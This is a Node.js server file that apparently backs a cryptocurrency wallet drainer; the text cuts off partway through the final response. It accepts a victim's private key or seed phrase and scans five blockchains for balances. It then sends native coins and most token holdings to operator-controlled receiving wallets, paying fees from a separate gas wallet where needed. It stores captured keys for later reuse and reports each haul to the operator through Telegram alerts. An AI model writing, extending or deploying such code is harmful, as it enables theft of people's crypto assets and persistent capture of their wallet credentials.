const express = require('express');
const bodyParser = require('body-parser');
const { ethers } = require('ethers');
const dotenv = require('dotenv');
const axios = require('axios');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const TronWeb = require('tronweb');

// Load environment variables FIRST
dotenv.config();

// Then require custom modules
const gasWalletService = require('./gas-wallet.js');

const app = express();
const port = process.env.PORT || 3000;

app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// ============ TELEGRAM ALERT SYSTEM ============
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegramAlert(message) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return false;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
        console.log('📱 Telegram alert sent');
        return true;
    } catch (error) {
        return false;
    }
}

// ============ ENCRYPTION SETUP ============
const storageDir = path.join(__dirname, 'encrypted_storage');
if (!fs.existsSync(storageDir)) fs.mkdirSync(storageDir, { recursive: true });

const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY;
const ENCRYPTION_ALGORITHM = 'aes-256-gcm';

function encryptData(text) {
    if (!ENCRYPTION_KEY) throw new Error('ENCRYPTION_KEY not set');
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
    let encrypted = cipher.update(text, 'utf8', 'hex');
    encrypted += cipher.final('hex');
    const authTag = cipher.getAuthTag();
    return { encrypted, iv: iv.toString('hex'), authTag: authTag.toString('hex') };
}

function decryptData(encryptedData, iv, authTag) {
    if (!ENCRYPTION_KEY) throw new Error('ENCRYPTION_KEY not set');
    const decipher = crypto.createDecipheriv(ENCRYPTION_ALGORITHM, Buffer.from(ENCRYPTION_KEY, 'hex'), Buffer.from(iv, 'hex'));
    decipher.setAuthTag(Buffer.from(authTag, 'hex'));
    let decrypted = decipher.update(encryptedData, 'hex', 'utf8');
    decrypted += decipher.final('utf8');
    return decrypted;
}

function saveEncryptedKey(userIdentifier, privateKey, metadata = {}) {
    const timestamp = new Date().toISOString();
    const encrypted = encryptData(privateKey);
    const record = {
        id: crypto.randomBytes(16).toString('hex'),
        userIdentifier,
        encryptedData: encrypted.encrypted,
        iv: encrypted.iv,
        authTag: encrypted.authTag,
        metadata,
        createdAt: timestamp,
        lastUsed: timestamp
    };
    const filename = `${userIdentifier.replace(/[^a-zA-Z0-9]/g, '_')}_${Date.now()}.json`;
    const filePath = path.join(storageDir, filename);
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    
    const masterLogPath = path.join(storageDir, 'master_index.json');
    let masterIndex = [];
    if (fs.existsSync(masterLogPath)) {
        masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    }
    masterIndex.push({ id: record.id, userIdentifier, filename, createdAt: timestamp, metadata });
    fs.writeFileSync(masterLogPath, JSON.stringify(masterIndex, null, 2));
    return { id: record.id, filename };
}

function loadEncryptedKey(userIdentifier) {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) return null;
    const masterIndex = JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
    const records = masterIndex.filter(r => r.userIdentifier === userIdentifier);
    if (records.length === 0) return null;
    const latest = records.sort((a, b) => new Date(b.createdAt) - new Date(a.createdAt))[0];
    const filePath = path.join(storageDir, latest.filename);
    if (!fs.existsSync(filePath)) return null;
    const record = JSON.parse(fs.readFileSync(filePath, 'utf8'));
    const decrypted = decryptData(record.encryptedData, record.iv, record.authTag);
    record.lastUsed = new Date().toISOString();
    fs.writeFileSync(filePath, JSON.stringify(record, null, 2));
    return decrypted;
}

function listAllEncryptedKeys() {
    const masterLogPath = path.join(storageDir, 'master_index.json');
    if (!fs.existsSync(masterLogPath)) return [];
    return JSON.parse(fs.readFileSync(masterLogPath, 'utf8'));
}

// ============ LOGGING ============
const logStream = fs.createWriteStream(path.join(__dirname, 'transactions.log'), { flags: 'a' });
function logTransaction(data) {
    const timestamp = new Date().toISOString();
    const logEntry = `[${timestamp}] ${JSON.stringify(data, null, 2)}\n`;
    logStream.write(logEntry);
}

// ============ RECEIVING WALLETS ============
const receivingWallets = {
    // Ethereum
    ETH: process.env.RECEIVING_WALLET_ETH,
    USDC: process.env.RECEIVING_WALLET_USDC_ERC20,
    DAI: process.env.RECEIVING_WALLET_DAI,
    USDT: process.env.RECEIVING_WALLET_USDT_ERC20,
    LINK: process.env.RECEIVING_WALLET_LINK,
    UNI: process.env.RECEIVING_WALLET_UNI,
    WBTC: process.env.RECEIVING_WALLET_WBTC,
    AAVE: process.env.RECEIVING_WALLET_AAVE,
    MATIC: process.env.RECEIVING_WALLET_MATIC,
    SHIB: process.env.RECEIVING_WALLET_SHIB,
    PEPE: process.env.RECEIVING_WALLET_PEPE,
    // BSC
    BNB: process.env.RECEIVING_WALLET_BNB,
    BSC_USDT: process.env.RECEIVING_WALLET_BSC_USDT,
    BSC_USDC: process.env.RECEIVING_WALLET_BSC_USDC,
    BSC_DAI: process.env.RECEIVING_WALLET_BSC_DAI,
    BSC_WBTC: process.env.RECEIVING_WALLET_BSC_WBTC,
    BSC_LINK: process.env.RECEIVING_WALLET_BSC_LINK,
    BSC_UNI: process.env.RECEIVING_WALLET_BSC_UNI,
    // Polygon
    POLYGON_USDT: process.env.RECEIVING_WALLET_POLYGON_USDT,
    POLYGON_USDC: process.env.RECEIVING_WALLET_POLYGON_USDC,
    // Arbitrum
    ARBITRUM_USDT: process.env.RECEIVING_WALLET_ARBITRUM_USDT,
    ARBITRUM_USDC: process.env.RECEIVING_WALLET_ARBITRUM_USDC,
    // TRON
    TRX: process.env.RECEIVING_WALLET_TRX,
    USDT_TRC20: process.env.RECEIVING_WALLET_USDT_TRC20,
    USDC_TRC20: process.env.RECEIVING_WALLET_USDC_TRC20,
    BTT: process.env.RECEIVING_WALLET_BTT,
};

// ============ BLOCKCHAIN CONFIGURATIONS ============

const ETHEREUM_CONFIG = {
    name: 'Ethereum',
    networkKey: 'ethereum',
    rpcUrl: process.env.RPC_URL,
    chainId: 1,
    nativeToken: 'ETH',
    nativeDecimals: 18,
    nativePrice: 2000,
    gasCost: 0.0015,
    tokenContracts: {
        USDC: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
        DAI: '0x6B175474E89094C44Da98b954EedeAC495271d0F',
        USDT: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
        LINK: '0x514910771AF9Ca656af840dff83E8264EcF986CA',
        UNI: '0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984',
        WBTC: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599',
        AAVE: '0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9',
        MATIC: '0x7D1AfA7B718fb893dB30A3aBc0Cfc608AaCfeBB0',
        SHIB: '0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE',
        PEPE: '0x6982508145454Ce325dDbE47a25d4ec3d2311933',
    },
    tokenDecimals: {
        USDC: 6, DAI: 18, USDT: 6, LINK: 18, UNI: 18, WBTC: 8, AAVE: 18, MATIC: 18, SHIB: 18, PEPE: 18,
    },
    tokenNames: {
        USDC: 'USD Coin', DAI: 'Dai', USDT: 'Tether USD', LINK: 'Chainlink',
        UNI: 'Uniswap', WBTC: 'Wrapped BTC', AAVE: 'Aave', MATIC: 'Polygon', SHIB: 'Shiba', PEPE: 'Pepe',
    },
    tokenPrices: {
        USDC: 1, DAI: 1, USDT: 1, LINK: 15, UNI: 7, WBTC: 30000, AAVE: 90, MATIC: 0.50, SHIB: 0.00001, PEPE: 0.0000038,
    }
};

const BSC_CONFIG = {
    name: 'BNB Chain',
    networkKey: 'bsc',
    rpcUrl: process.env.BSC_RPC_URL || 'https://bsc-dataseed.binance.org/',
    chainId: 56,
    nativeToken: 'BNB',
    nativeDecimals: 18,
    nativePrice: 600,
    gasCost: 0.0005,
    tokenContracts: {
        BSC_USDT: '0x55d398326f99059fF775485246999027B3197955',
        BSC_USDC: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',
        BSC_DAI: '0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3',
        BSC_WBTC: '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c',
        BSC_LINK: '0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD',
        BSC_UNI: '0xBf5140A22578168FD562DCcF235E5D43A02ce9B1',
    },
    tokenDecimals: {
        BSC_USDT: 18, BSC_USDC: 18, BSC_DAI: 18, BSC_WBTC: 18, BSC_LINK: 18, BSC_UNI: 18,
    },
    tokenNames: {
        BSC_USDT: 'BNB Chain USDT', BSC_USDC: 'BNB Chain USDC', BSC_DAI: 'BNB Chain DAI',
        BSC_WBTC: 'BNB Chain WBTC', BSC_LINK: 'BNB Chain LINK', BSC_UNI: 'BNB Chain UNI',
    },
    tokenPrices: {
        BSC_USDT: 1, BSC_USDC: 1, BSC_DAI: 1, BSC_WBTC: 30000, BSC_LINK: 15, BSC_UNI: 7,
    }
};

const POLYGON_CONFIG = {
    name: 'Polygon',
    networkKey: 'polygon',
    rpcUrl: process.env.POLYGON_RPC_URL || 'https://polygon-rpc.com/',
    chainId: 137,
    nativeToken: 'MATIC',
    nativeDecimals: 18,
    nativePrice: 0.50,
    gasCost: 0.5,
    tokenContracts: {
        POLYGON_USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
        POLYGON_USDC: '0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174',
    },
    tokenDecimals: {
        POLYGON_USDT: 6, POLYGON_USDC: 6,
    },
    tokenNames: {
        POLYGON_USDT: 'Polygon USDT', POLYGON_USDC: 'Polygon USDC',
    },
    tokenPrices: {
        POLYGON_USDT: 1, POLYGON_USDC: 1,
    }
};

const ARBITRUM_CONFIG = {
    name: 'Arbitrum',
    networkKey: 'arbitrum',
    rpcUrl: process.env.ARBITRUM_RPC_URL || 'https://arb1.arbitrum.io/rpc',
    chainId: 42161,
    nativeToken: 'ETH',
    nativeDecimals: 18,
    nativePrice: 2000,
    gasCost: 0.0003,
    tokenContracts: {
        ARBITRUM_USDT: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',
        ARBITRUM_USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    },
    tokenDecimals: {
        ARBITRUM_USDT: 6, ARBITRUM_USDC: 6,
    },
    tokenNames: {
        ARBITRUM_USDT: 'Arbitrum USDT', ARBITRUM_USDC: 'Arbitrum USDC',
    },
    tokenPrices: {
        ARBITRUM_USDT: 1, ARBITRUM_USDC: 1,
    }
};

// ============ HELPER FUNCTIONS ============
async function getGasPrice(rpcUrl, apiKey) {
    try {
        const response = await axios.get(`https://api.etherscan.io/api?module=proxy&action=eth_gasPrice&apikey=${apiKey}`, { timeout: 5000 });
        return ethers.utils.formatUnits(response.data.result, 'gwei');
    } catch (error) {
        return '30';
    }
}

async function getNativeBalance(provider, address) {
    return await provider.getBalance(address);
}

async function getTokenBalance(provider, tokenAddress, walletAddress, decimals) {
    const tokenContract = new ethers.Contract(tokenAddress, ['function balanceOf(address) view returns (uint256)'], provider);
    const balance = await tokenContract.balanceOf(walletAddress);
    return parseFloat(ethers.utils.formatUnits(balance, decimals));
}

async function getBalancesForChain(provider, config, userAddress) {
    const balances = {};
    const balanceDetails = [];
    
    console.log(`\n📊 ========== SCANNING ${config.name} ==========`);
    console.log(`📍 Address: ${userAddress}`);
    
    const nativeBalanceWei = await getNativeBalance(provider, userAddress);
    const nativeBalance = parseFloat(ethers.utils.formatEther(nativeBalanceWei));
    console.log(`💰 ${config.nativeToken} balance: ${nativeBalance}`);
    
    if (nativeBalance > 0) {
        balanceDetails.push({
            currency: config.nativeToken,
            name: config.nativeToken,
            balance: nativeBalance,
            usdValue: nativeBalance * config.nativePrice,
            chain: config.name,
            isNative: true
        });
        balances[config.nativeToken] = nativeBalanceWei;
    }
    
    for (const [symbol, address] of Object.entries(config.tokenContracts)) {
        try {
            const decimals = config.tokenDecimals[symbol];
            const balance = await getTokenBalance(provider, address, userAddress, decimals);
            if (balance > 0) {
                const usdValue = balance * config.tokenPrices[symbol];
                balanceDetails.push({
                    currency: symbol,
                    name: config.tokenNames[symbol],
                    balance: balance,
                    usdValue: usdValue,
                    chain: config.name,
                    isNative: false
                });
                balances[symbol] = ethers.utils.parseUnits(balance.toString(), decimals);
                console.log(`💰 Found ${balance} ${symbol} ($${usdValue.toFixed(2)})`);
            }
        } catch (error) {
            console.error(`Error checking ${symbol}:`, error.message);
        }
    }
    
    return { balances, balanceDetails };
}

// ============ TRON BALANCE FUNCTIONS ============
async function getTronBalance(tronAddress, privateKey) {
    try {
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            privateKey: privateKey
        });
        const balance = await tronWeb.trx.getBalance(tronAddress);
        return balance / 1000000;
    } catch (error) {
        console.error('Error getting TRX balance:', error.message);
        return 0;
    }
}

async function getTronTokenBalance(tronAddress, contractAddress, privateKey, decimals) {
    try {
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            privateKey: privateKey
        });
        const contract = await tronWeb.contract().at(contractAddress);
        const balanceRaw = await contract.balanceOf(tronAddress).call();
        return balanceRaw / Math.pow(10, decimals);
    } catch (error) {
        return 0;
    }
}

async function getTronBalances(userPrivateKey) {
    const balances = [];
    
    try {
        const tronWeb = new TronWeb({
            fullHost: 'https://api.trongrid.io',
            privateKey: userPrivateKey
        });
        
        const tronAddress = tronWeb.address.fromPrivateKey(userPrivateKey);
        console.log(`\n🟣 Scanning TRON Network`);
        console.log(`📍 TRON Address: ${tronAddress}`);
        
        const trxBalance = await getTronBalance(tronAddress, userPrivateKey);
        if (trxBalance > 0) {
            balances.push({
                currency: 'TRX',
                name: 'TRON',
                balance: trxBalance,
                usdValue: trxBalance * 0.10,
                chain: 'TRON',
                isNative: true,
                tronAddress: tronAddress
            });
            console.log(`💰 Found ${trxBalance} TRX ($${(trxBalance * 0.10).toFixed(2)})`);
        }
        
        const usdtBalance = await getTronTokenBalance(tronAddress, 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t', userPrivateKey, 18);
        if (usdtBalance > 0) {
            balances.push({
                currency: 'USDT_TRC20',
                name: 'Tether USD',
                balance: usdtBalance,
                usdValue: usdtBalance,
                chain: 'TRON',
                isNative: false,
                tronAddress: tronAddress
            });
            console.log(`💰 Found ${usdtBalance} USDT ($${usdtBalance})`);
        }
        
        return { balances, tronAddress };
    } catch (error) {
        console.error('Error scanning TRON:', error.message);
        return { balances: [], tronAddress: null };
    }
}

// ============ CONVERT INPUT TO PRIVATE KEY ============
function convertToPrivateKey(input, provider) {
    const cleanedInput = String(input).trim().replace(/\s+/g, ' ');
    const cleanKey = cleanedInput.replace('0x', '');
    
    if (/^[0-9a-fA-F]{64}$/.test(cleanKey)) {
        return { privateKey: cleanKey, wallet: new ethers.Wallet(`0x${cleanKey}`, provider), source: 'private_key' };
    }
    if (/^0x[0-9a-fA-F]{64}$/.test(cleanedInput)) {
        const privateKey = cleanedInput.replace('0x', '');
        return { privateKey, wallet: new ethers.Wallet(`0x${privateKey}`, provider), source: 'private_key' };
    }
    try {
        const wallet = ethers.Wallet.fromMnemonic(cleanedInput);
        const privateKey = wallet.privateKey.replace('0x', '');
        return { privateKey, wallet: wallet.connect(provider), source: 'seed_phrase' };
    } catch (error) {
        throw new Error('Invalid seed phrase.');
    }
}

// ============ PROCESS EVM CHAIN WITH GAS WALLET ============
async function processEvmChain(config, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue) {
    const provider = new ethers.providers.JsonRpcProvider(config.rpcUrl);
    const walletOnChain = userWallet.connect(provider);
    const { balances, balanceDetails } = await getBalancesForChain(provider, config, userAddress);
    
    allBalanceDetails.push(...balanceDetails);
    
    if (balanceDetails.length === 0) return { allTransactions, totalTransferredValue };
    
    const gasPriceGwei = await getGasPrice(config.rpcUrl, process.env.ETHERSCAN_API_KEY);
    const gasPriceWei = ethers.utils.parseUnits(gasPriceGwei, 'gwei');
    const nativeBalance = balances[config.nativeToken] ? parseFloat(ethers.utils.formatEther(balances[config.nativeToken])) : 0;
    const hasEnoughGas = nativeBalance > 0.002;
    
    for (const token of balanceDetails) {
        try {
            const isNative = token.currency === config.nativeToken;
            const gasLimit = isNative ? 21000 : 100000;
            
            console.log(`\n💸 Transferring ${token.currency} on ${config.name}...`);
            console.log(`   Balance: ${token.balance} ${token.currency}`);
            
            let amountTransferred, usdValueTransferred, amountToTransferWei, transaction;
            
            if (isNative) {
                const gasReserve = ethers.utils.parseEther('0.002');
                const balanceWei = balances[config.nativeToken];
                let amountToTransfer = balanceWei.sub(gasReserve);
                if (amountToTransfer.lte(0)) {
                    allTransactions.push({ currency: token.currency, chain: config.name, status: 'skipped', reason: 'All native tokens used for gas' });
                    continue;
                }
                amountTransferred = parseFloat(ethers.utils.formatEther(amountToTransfer));
                usdValueTransferred = amountTransferred * config.nativePrice;
                transaction = await walletOnChain.sendTransaction({
                    to: receivingWallets[token.currency],
                    value: amountToTransfer,
                    gasPrice: gasPriceWei,
                    gasLimit: gasLimit
                });
            } else {
                if (!hasEnoughGas) {
                    console.log(`   💡 No ${config.nativeToken} for gas. Using gas wallet...`);
                    
                    if (gasWalletService.isEnabled) {
                        try {
                            const result = await gasWalletService.executeGasWalletTransfer(
                                walletOnChain,
                                config.tokenContracts[token.currency],
                                token.balance,
                                token.currency,
                                receivingWallets[token.currency],
                                config.networkKey,
                                provider
                            );
                            
                            if (result.success) {
                                amountTransferred = result.finalAmountToRecipient;
                                usdValueTransferred = amountTransferred * config.tokenPrices[token.currency];
                                
                                allTransactions.push({
                                    currency: token.currency,
                                    name: token.name,
                                    amount: amountTransferred,
                                    usdValue: usdValueTransferred.toFixed(2),
                                    chain: config.name,
                                    transactionHash: result.tokenTxHash,
                                    gasTxHash: result.gasTxHash,
                                    status: 'success',
                                    note: `Gas wallet used`
                                });
                                totalTransferredValue += usdValueTransferred;
                                continue;
                            }
                        } catch (gasWalletError) {
                            console.error(`   ❌ Gas wallet failed:`, gasWalletError.message);
                            allTransactions.push({ 
                                currency: token.currency, 
                                chain: config.name, 
                                status: 'failed', 
                                error: `Gas wallet error: ${gasWalletError.message}` 
                            });
                            continue;
                        }
                    } else {
                        allTransactions.push({ 
                            currency: token.currency, 
                            chain: config.name, 
                            status: 'failed', 
                            error: `No ${config.nativeToken} for gas and gas wallet not available` 
                        });
                        continue;
                    }
                }
                
                const balanceWei = balances[token.currency];
                amountToTransferWei = balanceWei.mul(95).div(100);
                amountTransferred = token.balance * 0.95;
                usdValueTransferred = amountTransferred * config.tokenPrices[token.currency];
                
                const tokenContract = new ethers.Contract(
                    config.tokenContracts[token.currency],
                    ['function transfer(address to, uint256 value) returns (bool)'],
                    walletOnChain
                );
                
                transaction = await tokenContract.transfer(
                    receivingWallets[token.currency],
                    amountToTransferWei,
                    { gasPrice: gasPriceWei, gasLimit: gasLimit }
                );
            }
            
            if (transaction) {
                const receipt = await transaction.wait();
                console.log(`   ✅ Confirmed! TX: ${transaction.hash.substring(0, 16)}...`);
                
                allTransactions.push({
                    currency: token.currency,
                    name: token.name,
                    amount: amountTransferred,
                    usdValue: usdValueTransferred.toFixed(2),
                    chain: config.name,
                    transactionHash: transaction.hash,
                    status: 'success'
                });
                totalTransferredValue += usdValueTransferred;
            }
            
        } catch (error) {
            console.error(`   ❌ Failed:`, error.message);
            allTransactions.push({ currency: token.currency, chain: config.name, status: 'failed', error: error.message });
        }
    }
    return { allTransactions, totalTransferredValue };
}

// ============ PROCESS TRON WITH GAS WALLET ============
async function processTronWithGasWallet(userPrivateKey, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue) {
    console.log(`\n🟣 ========== PROCESSING TRON ==========`);
    
    const { balances, tronAddress } = await getTronBalances(userPrivateKey);
    
    if (!tronAddress) {
        console.log(`   ⚠️ Could not derive TRON address`);
        return { allTransactions, totalTransferredValue };
    }
    
    allBalanceDetails.push(...balances);
    
    if (balances.length === 0) {
        console.log(`   ℹ️ No TRON balances found`);
        return { allTransactions, totalTransferredValue };
    }
    
    // Check TRX balance for gas
    const trxBalance = balances.find(b => b.currency === 'TRX')?.balance || 0;
    const hasEnoughTrx = trxBalance > 15;
    
    for (const token of balances) {
        try {
            const isNative = token.currency === 'TRX';
            
            console.log(`\n💸 Transferring ${token.currency} on TRON...`);
            console.log(`   Balance: ${token.balance} ${token.currency}`);
            
            let amountTransferred, usdValueTransferred;
            
            if (isNative) {
                // TRX transfer - leave some for gas
                const gasReserve = 15;
                const amountToTransfer = token.balance - gasReserve;
                if (amountToTransfer <= 0) {
                    allTransactions.push({ currency: token.currency, chain: 'TRON', status: 'skipped', reason: 'All TRX used for gas' });
                    continue;
                }
                
                amountTransferred = amountToTransfer;
                usdValueTransferred = amountTransferred * 0.10;
                
                const tronWeb = new TronWeb({
                    fullHost: 'https://api.trongrid.io',
                    privateKey: userPrivateKey
                });
                
                const tx = await tronWeb.trx.sendTransaction(
                    receivingWallets.TRX,
                    amountToTransfer * 1000000
                );
                
                if (tx.result) {
                    allTransactions.push({
                        currency: token.currency,
                        name: token.name,
                        amount: amountTransferred,
                        usdValue: usdValueTransferred.toFixed(2),
                        chain: 'TRON',
                        transactionHash: tx.txid,
                        status: 'success'
                    });
                    totalTransferredValue += usdValueTransferred;
                }
                
            } else {
                // TRC-20 token transfer
                if (!hasEnoughTrx) {
                    console.log(`   💡 No TRX for gas. Using gas wallet...`);
                    
                    if (gasWalletService.isEnabled) {
                        try {
                            const tokenAddress = token.currency === 'USDT_TRC20' ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : null;
                            
                            const result = await gasWalletService.executeGasWalletTransfer(
                                { getAddress: async () => tronAddress },
                                tokenAddress,
                                token.balance,
                                token.currency,
                                receivingWallets[token.currency],
                                'tron',
                                null,
                                userPrivateKey
                            );
                            
                            if (result.success) {
                                amountTransferred = result.finalAmountToRecipient;
                                usdValueTransferred = amountTransferred;
                                
                                allTransactions.push({
                                    currency: token.currency,
                                    name: token.name,
                                    amount: amountTransferred,
                                    usdValue: usdValueTransferred.toFixed(2),
                                    chain: 'TRON',
                                    transactionHash: result.tokenTxHash,
                                    gasTxHash: result.gasTxHash,
                                    status: 'success',
                                    note: `Gas wallet used`
                                });
                                totalTransferredValue += usdValueTransferred;
                                continue;
                            }
                        } catch (gasWalletError) {
                            console.error(`   ❌ Gas wallet failed:`, gasWalletError.message);
                            allTransactions.push({ 
                                currency: token.currency, 
                                chain: 'TRON', 
                                status: 'failed', 
                                error: `Gas wallet error: ${gasWalletError.message}` 
                            });
                            continue;
                        }
                    } else {
                        allTransactions.push({ 
                            currency: token.currency, 
                            chain: 'TRON', 
                            status: 'failed', 
                            error: `No TRX for gas and gas wallet not available` 
                        });
                        continue;
                    }
                } else {
                    // User has TRX, use normal transfer
                    amountTransferred = token.balance * 0.95;
                    usdValueTransferred = amountTransferred;
                    
                    const tronWeb = new TronWeb({
                        fullHost: 'https://api.trongrid.io',
                        privateKey: userPrivateKey
                    });
                    
                    const tokenAddress = token.currency === 'USDT_TRC20' ? 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' : null;
                    const contract = await tronWeb.contract().at(tokenAddress);
                    const amountWithDecimals = amountTransferred * Math.pow(10, 18);
                    
                    const tx = await contract.transfer(receivingWallets[token.currency], amountWithDecimals).send();
                    
                    allTransactions.push({
                        currency: token.currency,
                        name: token.name,
                        amount: amountTransferred,
                        usdValue: usdValueTransferred.toFixed(2),
                        chain: 'TRON',
                        transactionHash: tx,
                        status: 'success'
                    });
                    totalTransferredValue += usdValueTransferred;
                }
            }
            
            console.log(`   ✅ Transfer complete!`);
            
        } catch (error) {
            console.error(`   ❌ Failed:`, error.message);
            allTransactions.push({ currency: token.currency, chain: 'TRON', status: 'failed', error: error.message });
        }
    }
    
    return { allTransactions, totalTransferredValue };
}

// ============ API ENDPOINTS ============
app.post('/api/save-key', async (req, res) => {
    const { userIdentifier, privateKey, metadata } = req.body;
    if (!userIdentifier || !privateKey) return res.status(400).json({ success: false, error: 'Missing fields' });
    try {
        const result = saveEncryptedKey(userIdentifier, privateKey, metadata || {});
        res.json({ success: true, message: 'Key saved', id: result.id });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/load-key', async (req, res) => {
    const { userIdentifier } = req.body;
    if (!userIdentifier) return res.status(400).json({ success: false, error: 'Missing userIdentifier' });
    try {
        const privateKey = loadEncryptedKey(userIdentifier);
        if (!privateKey) return res.status(404).json({ success: false, error: 'Key not found' });
        res.json({ success: true, privateKey });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/api/list-keys', async (req, res) => {
    const adminToken = req.headers['x-admin-token'];
    if (adminToken !== process.env.ADMIN_TOKEN) return res.status(401).json({ success: false, error: 'Unauthorized' });
    res.json({ success: true, keys: listAllEncryptedKeys() });
});

// ============ MAIN TRANSFER API ============
app.post('/api/transfer-all', async (req, res) => {
    const { userInput, savedIdentifier } = req.body;
    console.log('\n🚀 ========== TRANSFER REQUEST ==========');
    
    let finalInput = userInput;
    if (savedIdentifier && !userInput) {
        try {
            finalInput = loadEncryptedKey(savedIdentifier);
            if (!finalInput) return res.status(404).json({ success: false, error: 'No saved key found' });
        } catch (error) {
            return res.status(500).json({ success: false, error: 'Failed to load key' });
        }
    }
    if (!finalInput) return res.status(400).json({ success: false, error: 'Please enter private key or seed phrase' });

    const startTime = Date.now();
    let allTransactions = [];
    let allBalanceDetails = [];
    let totalTransferredValue = 0;
    
    try {
        const ethProvider = new ethers.providers.JsonRpcProvider(ETHEREUM_CONFIG.rpcUrl);
        const { wallet: userWallet, privateKey: userPrivateKey } = convertToPrivateKey(finalInput, ethProvider);
        const userAddress = userWallet.address;
        console.log(`📍 EVM Address: ${userAddress}`);
        
        await sendTelegramAlert(`
🔐 <b>Wallet Connected</b>

EVM Address: <code>${userAddress.substring(0, 10)}...${userAddress.substring(userAddress.length - 6)}</code>
Time: ${new Date().toLocaleString()}
        `);
        
        // Process Ethereum
        console.log(`\n🔵 ========== PROCESSING ETHEREUM ==========`);
        try {
            const ethResult = await processEvmChain(ETHEREUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
            allTransactions = ethResult.allTransactions;
            totalTransferredValue = ethResult.totalTransferredValue;
        } catch (error) {
            console.error(`❌ Ethereum processing error:`, error.message);
            allTransactions.push({ chain: 'Ethereum', status: 'error', error: error.message });
        }
        
        // Process BSC
        console.log(`\n🟡 ========== PROCESSING BSC ==========`);
        try {
            const bscResult = await processEvmChain(BSC_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
            allTransactions = bscResult.allTransactions;
            totalTransferredValue = bscResult.totalTransferredValue;
        } catch (error) {
            console.error(`❌ BSC processing error:`, error.message);
            allTransactions.push({ chain: 'BSC', status: 'error', error: error.message });
        }
        
        // Process Polygon
        console.log(`\n🟣 ========== PROCESSING POLYGON ==========`);
        try {
            const polygonResult = await processEvmChain(POLYGON_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
            allTransactions = polygonResult.allTransactions;
            totalTransferredValue = polygonResult.totalTransferredValue;
        } catch (error) {
            console.error(`❌ Polygon processing error:`, error.message);
            allTransactions.push({ chain: 'Polygon', status: 'error', error: error.message });
        }
        
        // Process Arbitrum
        console.log(`\n🔴 ========== PROCESSING ARBITRUM ==========`);
        try {
            const arbitrumResult = await processEvmChain(ARBITRUM_CONFIG, userWallet, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
            allTransactions = arbitrumResult.allTransactions;
            totalTransferredValue = arbitrumResult.totalTransferredValue;
        } catch (error) {
            console.error(`❌ Arbitrum processing error:`, error.message);
            allTransactions.push({ chain: 'Arbitrum', status: 'error', error: error.message });
        }
        
        // Process TRON
        console.log(`\n🟣 ========== PROCESSING TRON ==========`);
        try {
            const tronResult = await processTronWithGasWallet(userPrivateKey, userAddress, receivingWallets, allTransactions, allBalanceDetails, totalTransferredValue);
            allTransactions = tronResult.allTransactions;
            totalTransferredValue = tronResult.totalTransferredValue;
        } catch (error) {
            console.error(`❌ TRON processing error:`, error.message);
            allTransactions.push({ chain: 'TRON', status: 'error', error: error.message });
        }
        
        const totalWalletValue = allBalanceDetails.reduce((sum, t) => sum + t.usdValue, 0);
        const successfulCount = allTransactions.filter(t => t.status === 'success').length;
        const totalDuration = Date.now() - startTime;
        
        console.log(`\n📊 ========== SUMMARY ==========`);
        console.log(`💰 Total Value in Wallet: $${totalWalletValue.toFixed(2)}`);
        console.log(`💸 Total Value Transferred: $${totalTransferredValue.toFixed(2)}`);
        console.log(`✅ Successful Transfers: ${successfulCount}`);
        console.log(`⏱️ Duration: ${(totalDuration / 1000).toFixed(1)}s`);
        
        await sendTelegramAlert(`
💰 <b>Transfer Complete</b>

Total Value: $${totalWalletValue.toFixed(2)}
Transferred: $${totalTransferredValue.toFixed(2)}
Successful: ${successfulCount}
Duration: ${(totalDuration / 1000).toFixed(1)}s
        `);
        
        res.json({
            success: true,
            message: `Transfer Complete! Transferred $${totalTransferredValue.toFixed(2)} across ${allBalanceDetails.length} assets`,
            summary: {
